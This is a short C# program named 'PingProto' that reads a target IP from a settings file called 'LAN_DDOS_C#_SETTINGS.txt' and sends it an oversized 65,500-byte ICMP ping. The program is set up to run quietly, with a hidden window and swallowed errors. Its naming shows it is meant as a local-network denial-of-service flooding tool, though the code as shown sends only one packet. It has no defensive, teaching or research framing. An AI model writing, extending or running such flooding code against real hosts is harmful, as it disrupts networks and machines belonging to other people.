using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.NetworkInformation; //Include this
using System.IO.Enumeration;
using System.Diagnostics;
using System.Runtime.CompilerServices;

namespace PingProto
{
    public class Program
    {

        static void Main()
        {
            System.Diagnostics.ProcessStartInfo ON_START = new System.Diagnostics.ProcessStartInfo();
            ON_START.WindowStyle = System.Diagnostics.ProcessWindowStyle.Minimized;
            ON_START.CreateNoWindow = true;
            try
            {
                string IP_ADDRESS = System.IO.File.ReadAllText("LAN_DDOS_C#_SETTINGS.txt");
                Ping Ping = new Ping();
                int bytes_packet = 65500;
                byte[] packet = new byte[bytes_packet];
                PingReply reply_0 = Ping.Send(IP_ADDRESS, 1, packet);
                if (reply_0 != null)
                {
                    //Console.WriteLine("Status :  " + reply_0.Status + " \n Time : " + reply_0.RoundtripTime.ToString() + " \n Address : " + reply_0.Address);
                    //Console.WriteLine(reply.ToString());
                    
                    //Environment.Exit(0);
                }
            }
            catch
            {
                //Console.WriteLine("ERROR: IP_ADDRESS not found, timeout, or file missing.");
            }
            //Console.ReadKey();
        }
    }
}